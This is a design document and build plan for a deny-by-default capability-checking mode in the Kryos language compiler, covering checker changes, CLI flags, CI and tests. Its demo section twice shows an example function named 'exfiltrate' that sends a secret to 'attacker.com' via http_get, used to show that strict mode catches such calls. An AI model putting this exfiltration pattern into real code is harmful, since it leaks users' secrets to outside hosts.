# Project 11: Kryos Strict-Capabilities Mode (--strict-capabilities / Deny-by-Default)

**One-liner:** Unannotated functions become compile errors for capability-gated builtins -- the system shifts from opt-in documentation to opt-in exemption.

---

## Why This Is Novel

**Novelty rating: TRULY-NOVEL** (with one honest caveat below)

No mainstream general-purpose language offers this as a first-class, integrated, compiler-enforced feature:

- **Python** has no capability model. `open()`, `socket()`, `subprocess.run()` are always available everywhere.
- **Rust** has no capability model either. The borrow checker enforces memory safety, not resource access. `std::fs::File::open` is callable anywhere with no annotation.
- **Java** has a SecurityManager (now removed in Java 17+) and module system (`opens`/`exports`), but these are coarse runtime checks, not compile-time per-function declarations.
- **Deno** enforces capabilities at the process level via CLI flags (`--allow-net`, `--allow-read`), not per-function at compile time. A single flag opens the entire program.
- **Wasm Component Model** enforces capabilities at the WASM component boundary (import/export surface), not inside a single module's function call graph.
- **Scala / Haskell effects crates** (e.g. `frunk`, `polysemy`) and Rust effects crates (e.g. `eff`) layer capability tracking on top via types, but they are library conventions requiring the programmer to opt in per-function. No compiler enforcement exists for unmarked code.
- **Cap'n Proto / CloudABI / WASI**: syscall-level capability enforcement at the OS or hypervisor boundary, not language-level per-function enforcement.

The honest caveat: **WASM sandbox + Deno** achieve a similar end result (code cannot do things it was not authorized to do) but at process granularity, not function granularity. If the MVP goal is "audit trail / cannot exfiltrate", Deno is partial prior art. What Kryos adds is:

1. Per-function declaration in source -- a single binary can have mixed-trust functions.
2. Compile-time enforcement, not runtime.
3. Attenuation enforced across the call graph inside a single module.
4. The annotation is authoritative documentation: the capability set is human-readable, type-checker-verified, and machine-auditable from the AST.

**Why Kryos is the right substrate**: The existing `kryos-capabilities` crate already has the full model (`CapabilitySet`, `Capability`, `required_capability_for_builtin`, `required_capability_for_path`, `check_capabilities`). The only missing piece is removing one `if self.has_annotated_scope()` guard. The entire enforcement infrastructure is already proven in annotated-function scope; strict mode simply extends that scope to the entire module.

---

## Which Kryos Primitives This Uses

All of the following are REAL, implemented, and verified from source:

| File | Relevant Surface |
|------|-----------------|
| `compiler/crates/kryos-capabilities/src/checker.rs` | `has_annotated_scope()` guard at line 537; the guard is the ONLY blocker for strict mode |
| `compiler/crates/kryos-capabilities/src/checker.rs` | `check_callee_capabilities()`, `CapabilityScope { capabilities, annotated }`, `fn_capabilities` map |
| `compiler/crates/kryos-capabilities/src/model.rs` | `Capability` (11 variants: Net, Io, Ffi, Compute, Crypto, Process, Env, Term, Db, Time, All), `CapabilitySet`, `required_capability_for_builtin`, `required_capability_for_path` |
| `compiler/crates/kryos-driver/src/config.rs` | `BuildConfig` struct -- add `strict_capabilities: bool` field here |
| `compiler/crates/kryos-driver/src/pipeline.rs` | `check_capabilities(&module)` call at stage 7 -- needs to pass strict mode flag |
| `compiler/crates/kryos-cli/src/main.rs` | `Commands::Build` and `Commands::Check` -- add `--strict-capabilities` arg |
| `compiler/crates/kryos-errors/src/lib.rs` | `Diagnostic`, error codes `E0502` / `E0505` -- the checker already emits these; strict mode reuses them |

**Language work needed first:**

1. A `#![strict_capabilities]` file-level annotation (module-level `#![...]` syntax). Check whether the parser already supports module-level inner attributes. If not, a small parser addition is needed. This is **low risk** -- the annotation only needs to flip a bool in the module's metadata before the capabilities pass runs.
2. The `check_capabilities` function signature needs a `StrictMode` parameter (or a config struct) so the driver can pass strict-mode on without touching the checker internals more than the one guard.
3. No new language features are needed beyond the flag and annotation. No new builtins. No backend changes.

**What does NOT need to change:**

- The `Capability` enum and `CapabilitySet` -- complete.
- `required_capability_for_builtin` and `required_capability_for_path` -- complete mapping of all gated builtins.
- The attenuation check (child cannot exceed parent) -- already enforced.
- Error codes E0502, E0505, E0507 -- already defined and rendered.
- The CI pipeline -- add a new job matrix entry.

---

## Architecture

### Current behavior (opt-in, today)

The checker gate at `checker.rs:537`:

```rust
if self.has_annotated_scope() {
    if let Some(caps) = self.current_caps() {
        if !caps.has(required_cap) {
            // emit E0505
        }
    }
}
```

`has_annotated_scope()` returns true only when some enclosing function has `@capabilities(...)`. Result: unannotated functions are completely unconstrained. `file_write()` in an unannotated function: no error.

### Strict mode behavior

In strict mode, unannotated functions are treated as having `CapabilitySet::empty()`. The `has_annotated_scope()` guard is replaced by a mode check:

```rust
// In strict mode, every function is "annotated" (with the empty set unless explicit).
let in_scope = self.strict_mode || self.has_annotated_scope();
if in_scope {
    if let Some(caps) = self.current_caps() {
        if !caps.has(required_cap) {
            // emit E0505 (or a new strict-mode variant E0508)
        }
    }
}
```

The `check_function` path also needs to push unannotated functions with `annotated: true` when in strict mode:

```rust
let scope = CapabilityScope {
    capabilities: caps,  // CapabilitySet::empty() for unannotated in strict mode
    annotated: annotated || self.strict_mode,
};
```

### Data model additions

`BuildConfig` in `config.rs`:

```rust
pub struct BuildConfig {
    // ... existing fields ...
    /// Deny all capability-gated builtins in unannotated functions.
    /// Equivalent to treating every function as @capabilities() with an empty set
    /// unless it explicitly declares @capabilities(...).
    pub strict_capabilities: bool,
}
```

`check_capabilities` signature in `checker.rs`:

```rust
pub fn check_capabilities(module: &Module) -> Vec<Diagnostic> { ... }
// becomes:
pub fn check_capabilities(module: &Module, strict: bool) -> Vec<Diagnostic> { ... }
```

All call sites in `pipeline.rs` pass `config.strict_capabilities` (or detect the `#![strict_capabilities]` annotation in the parsed AST before the call).

### File-level annotation (module-level opt-in)

A `.kry` file can opt in per-file without a CLI flag:

```kryos
#![strict_capabilities]

// From this point, every unannotated function in this file is
// checked as if it has @capabilities() -- the empty set.

fn safe_compute(x: i64) -> i64 {
    return x * x
}

// This is now a COMPILE ERROR in strict mode:
// fn leaky() {
//     file_write("out.txt", "data")  // E0505: requires `io`
// }

@capabilities(io)
fn write_result(path: str, data: str) {
    file_write(path, data)
}
```

The parser already handles `#![...]` inner attributes on the module node (verify by checking `kryos-ast/src/lib.rs` `Module` struct for an `attributes` field; if absent, add it -- one AST field, no grammar ambiguity since `#!` at file start is unambiguous).

### Kryos code examples (real syntax, no semicolons)

**Before strict mode -- this compiles today:**

```kryos
// unannotated: no capability checking
fn fetch_and_save(url: str, path: str) {
    let data = http_get(url)   // requires net -- NOT CHECKED in current mode
    file_write(path, data)     // requires io  -- NOT CHECKED in current mode
}
```

**With --strict-capabilities -- this is now a compile error:**

```kryos
// error E0505: builtin `http_get` requires `net` capability
// error E0505: builtin `file_write` requires `io` capability
fn fetch_and_save(url: str, path: str) {
    let data = http_get(url)
    file_write(path, data)
}
```

**Fixed -- annotate the function:**

```kryos
@capabilities(net, io)
fn fetch_and_save(url: str, path: str) {
    let data = http_get(url)
    file_write(path, data)
}
```

**Attenuation still enforced (already works today, preserved in strict mode):**

```kryos
@capabilities(net)
fn fetch_only(url: str) -> str {
    return http_get(url)
}

@capabilities(net, io)
fn fetch_and_save(url: str, path: str) {
    let data = fetch_only(url)   // OK: fetch_only needs net, caller has net
    file_write(path, data)       // OK: caller has io
}

@capabilities(net)
fn bad_caller(url: str) {
    fetch_and_save(url, "/tmp/x")   // E0507: callee needs io, caller lacks io
}
```

**Agent example -- the safety story:**

```kryos
use std::llm::{chat, Message}
use std::agent::{AgentMemory}

@capabilities(net)
@budget(tokens=10000, calls=20)
fn run_agent(prompt: str) -> str {
    let msgs = [Message { role: "user", content: prompt }]
    let reply = chat("claude-3-5-sonnet-20241022", msgs)
    return reply
}

// This function can NEVER call http_get or file_write --
// the build fails if someone adds them without annotating.
fn process_reply(text: str) -> str {
    return text
}
```

In strict mode, the fact that `process_reply` cannot touch the network or filesystem is a **compile-time guarantee**, not a convention. Any future developer who adds `http_get(...)` to `process_reply` gets E0505 before the binary exists.

---

## MVP Scope vs Full Vision

### MVP (2-3 days compiler work)

1. Add `strict_capabilities: bool` to `BuildConfig`.
2. Add `--strict-capabilities` flag to `kryos build` and `kryos check` in `main.rs`.
3. Thread the flag into the `check_capabilities` call in `pipeline.rs`.
4. Modify `CapabilityChecker` to accept `strict: bool`, replacing the `has_annotated_scope()` guard in the builtin-check path.
5. In strict mode, push unannotated functions with `annotated: true` and `capabilities: CapabilitySet::empty()`.
6. Add a CI matrix job: `kryos check --strict-capabilities` over `examples/` (with annotations added as part of this PR).
7. Write a migration guide: how to annotate existing code module-by-module.

**Not in MVP:**

- `#![strict_capabilities]` file-level annotation (parser addition needed; defer to v2).
- Per-package `[capabilities] strict = true` in `kryos.toml`.
- A `kryos migrate --add-capability-annotations` auto-fixer that infers and adds the minimum annotation set.
- Sub-capabilities (`io:read` vs `io:write`) -- the model only has coarse-grained capabilities today; strict mode works with what exists.
- Runtime capability enforcement (deny-by-default sandbox for WASM targets).

### Full Vision

Once `--strict-capabilities` is stable:

- `[capabilities] strict = true` in `kryos.toml` makes strict mode the project default.
- `#![strict_capabilities]` enables strict mode per file, for incremental adoption.
- `#![allow_capability(io)]` provides a per-file override escape hatch (auditable, not invisible).
- Sub-capabilities: `io:read`, `io:write`, `net:outbound`, `net:listen` -- finer-grained control.
- `kryos audit --strict` reports the capability surface of the entire project, even in non-strict mode.
- WASM sandbox story: in strict mode, the compiler can emit a WASM capability import table that the host can enforce at the WASM boundary (project 12 depends on this).
- Plugin architecture: a plugin loaded by a host can have `@capabilities(db)` and the host can refuse to load it if it declares `net` -- attenuation-safe plugins.

---

## Build Plan (ordered steps for a fresh session)

### Step 0: Read the codebase (15 min)

1. Read `compiler/crates/kryos-capabilities/src/checker.rs` -- understand `has_annotated_scope()`, `check_callee_capabilities`, `CapabilityScope`.
2. Read `compiler/crates/kryos-capabilities/src/model.rs` -- understand `CapabilitySet`, `required_capability_for_builtin`.
3. Read `compiler/crates/kryos-driver/src/config.rs` -- the `BuildConfig` struct.
4. Grep `check_capabilities` in `compiler/crates/kryos-driver/src/pipeline.rs` to find all call sites.
5. Read `compiler/crates/kryos-cli/src/main.rs` lines 27-90 (Build subcommand) and 107-119 (Check subcommand).

### Step 1: Extend the capability checker (1-2 hours)

File: `compiler/crates/kryos-capabilities/src/lib.rs`

Change the public API:

```rust
// Before:
pub fn check_capabilities(module: &Module) -> Vec<Diagnostic>

// After:
pub fn check_capabilities(module: &Module, strict: bool) -> Vec<Diagnostic>
```

File: `compiler/crates/kryos-capabilities/src/checker.rs`

Add `strict_mode: bool` to `CapabilityChecker`:

```rust
struct CapabilityChecker {
    scope_stack: Vec<CapabilityScope>,
    diagnostics: Vec<Diagnostic>,
    fn_capabilities: HashMap<String, CapabilitySet>,
    strict_mode: bool,   // NEW
}
```

In `CapabilityChecker::new`, add `strict_mode: false`.

Add a constructor `CapabilityChecker::new_strict()` or just pass `strict: bool` to `new(strict: bool)`.

In `check_function`, change the scope push:

```rust
// Before:
let scope = CapabilityScope {
    capabilities: caps,
    annotated,
};

// After:
let scope = CapabilityScope {
    capabilities: caps,
    // In strict mode, every function is "annotated" -- enforce against empty set.
    annotated: annotated || self.strict_mode,
};
```

In `check_callee_capabilities`, replace the guard:

```rust
// Before (line 537):
if self.has_annotated_scope() {

// After:
if self.strict_mode || self.has_annotated_scope() {
```

Apply the same change to the cross-function propagation check (line 564):

```rust
// Before:
if self.has_annotated_scope() {

// After:
if self.strict_mode || self.has_annotated_scope() {
```

Add tests in `checker.rs` for strict mode:

- Unannotated function calling `file_write` in strict mode: expect E0505.
- Same function in non-strict mode: expect no errors (existing behavior preserved).
- Unannotated function with NO capability-gated calls in strict mode: expect no errors.
- `@capabilities(io)` function calling `file_write` in strict mode: expect no errors.

### Step 2: Extend BuildConfig (30 min)

File: `compiler/crates/kryos-driver/src/config.rs`

Add `strict_capabilities: bool` field to `BuildConfig`. Default: `false`. Update `for_file` and `for_project` constructors.

### Step 3: Thread flag through the driver pipeline (30 min)

File: `compiler/crates/kryos-driver/src/pipeline.rs`

Find all four `check_capabilities(&module)` call sites and change to:

```rust
check_capabilities(&module, config.strict_capabilities)
```

Verify the function signature accepts the config at all call sites (some call sites may be in `check_file` paths that take a `BuildConfig` ref, some may need the bool threaded differently).

### Step 4: Add CLI flag (30 min)

File: `compiler/crates/kryos-cli/src/main.rs`

In `Commands::Build`, add:

```rust
/// Deny capability-gated builtins in unannotated functions.
/// Every function must declare @capabilities(...) or the build fails.
#[arg(long)]
strict_capabilities: bool,
```

Add the same to `Commands::Check`.

In the `Commands::Build` arm of `main()`:

```rust
let config = BuildConfig {
    // ...
    strict_capabilities,
    // ...
};
```

In `commands::build::execute`, add `strict_capabilities: bool` parameter and thread it into `BuildConfig`.

Similarly for `commands::check::execute`.

### Step 5: Annotate existing examples (1 hour)

Run `kryos check --strict-capabilities examples/` and observe errors. Add the minimum `@capabilities(...)` annotations to all example files that use capability-gated builtins. This is the "migration guide" demo:

```
examples/showcase/http_server.kry  -> @capabilities(net)
examples/showcase/kvdb.kry         -> @capabilities(io)
examples/showcase/agent.kry        -> @capabilities(net)
```

The migration process for real projects: run the checker, read the errors, add annotations. The error messages already say `"add @capabilities(X) to the enclosing function"`.

### Step 6: CI matrix job (30 min)

Add a job to the GitHub Actions workflow:

```yaml
strict-capabilities:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - name: Build compiler
      run: cargo build --release -p kryos-cli
    - name: Check examples in strict mode
      run: |
        for f in examples/**/*.kry; do
          ./target/release/kryos check --strict-capabilities "$f"
        done
```

This locks in that all examples stay annotated as the codebase grows.

### Step 7: Capability report for `kryos audit` (optional, polish)

If time permits: in `audit_cmd.rs`, add a section that prints the capability surface of the project -- each function and its declared capabilities. This makes the strict-mode guarantee visible to auditors without reading source.

---

## Success Criteria / How to Demo

**Demo script for a fresh session or a blog post:**

1. Create a file `bad_agent.kry`:

```kryos
fn exfiltrate(secret: str) {
    let url = "http://attacker.com/steal?d=" + secret
    http_get(url)
}

fn process(data: str) -> str {
    exfiltrate(data)
    return data
}
```

2. Without strict mode:

```
kryos check bad_agent.kry
```

Output: no errors. The capability system documents nothing for unannotated functions.

3. With strict mode:

```
kryos check --strict-capabilities bad_agent.kry
```

Output:

```
error[E0505]: builtin `http_get` requires `net` capability
  --> bad_agent.kry:3:5
   |
3  |     http_get(url)
   |     ^^^^^^^^^^^^^ requires `net`
   |
   = help: add `@capabilities(net)` to the enclosing function `exfiltrate`
```

4. Fix by annotating -- and now the annotation is auditable:

```kryos
@capabilities(net)
fn exfiltrate(secret: str) {
    let url = "http://attacker.com/steal?d=" + secret
    http_get(url)
}
```

The capability annotation is now visible in code review, in `kryos audit`, and in any tooling that reads the AST. An attacker cannot add `http_get` to an unannotated function without the build failing.

**Success gates:**

- `kryos check --strict-capabilities` on a file with unannotated `http_get` / `file_write` produces E0505.
- `kryos check --strict-capabilities` on a fully-annotated file produces zero errors.
- `kryos check` (without flag) on both files produces zero errors (no regression).
- All existing tests in `kryos-capabilities/src/checker.rs` still pass.
- New strict-mode tests in `checker.rs` pass.
- CI matrix job green.

---

## Risks + Honest Unknowns

**Risk 1: Module-level attribute parser support**

The MVP defers `#![strict_capabilities]` and uses only the CLI flag. This avoids parser risk entirely. If you want per-file annotation, first check whether `Module` in `kryos-ast/src/lib.rs` has an `attributes` or `inner_attrs` field. If not, add it -- but this is a small AST addition that may break fewer things than it looks.

**Risk 2: All four `check_capabilities` call sites in pipeline.rs**

Two of the four call sites may be in `check_file` paths that do not currently carry a `BuildConfig` -- they may call with defaults. Thread a `strict: bool` parameter through those paths directly rather than requiring a full `BuildConfig`.

**Risk 3: Self-host compiler breakage**

The self-host compiler (under `compiler/self-host/`) compiles itself. Running `--strict-capabilities` on the self-host source before annotating it will generate thousands of errors. Do NOT add `strict_capabilities: true` to any default config. The flag must remain opt-in.

**Risk 4: Import-level checking gap**

The current `check_decl` for `Decl::Import` only emits E0501 if there is a `current_caps()` scope (i.e., inside a function body). Top-level imports are not checked in strict mode. This is intentional -- `use std::io::{write_file}` at file level is a declaration, not a call. The actual call site inside a function is what gets flagged. No change needed here.

**Risk 5: `all` capability in strict mode**

`@capabilities(all)` is already defined and already bypasses all checks (CapabilitySet::has() returns true for everything). In strict mode, a function annotated `@capabilities(all)` is still unconstrained. This is correct behavior -- the annotation is explicit and auditable. Future work: a `kryos audit` lint that flags `@capabilities(all)` as a warning.

**Unknown: cross-function propagation in strict mode**

The cross-function propagation check (E0507) in `check_callee_capabilities` currently checks `if self.has_annotated_scope()`. In strict mode this becomes always-true. This means calling any annotated function from an unannotated function will now trigger E0507 if the callee needs capabilities the caller lacks (empty set). This is correct behavior but may produce many errors in real codebases that mix annotated and unannotated functions. It is the right behavior -- but document it in the migration guide.

**Not a risk: backend changes**

Strict mode is purely a compile-time checker change. No codegen, no MIR changes, no runtime impact. Both Cranelift and LLVM backends are unaffected.

---

## Dependency

This project depends on Project 01 (core capability system) -- which is already shipped. No other dependencies.

This project unlocks:

- Project 12: WASM sandbox story (strict mode provides the compile-time guarantee that the WASM capability import table is complete).
- Plugin architecture: attenuation-safe plugin loading (host verifies declared capabilities at load time).
- `kryos audit --strict` reporting.
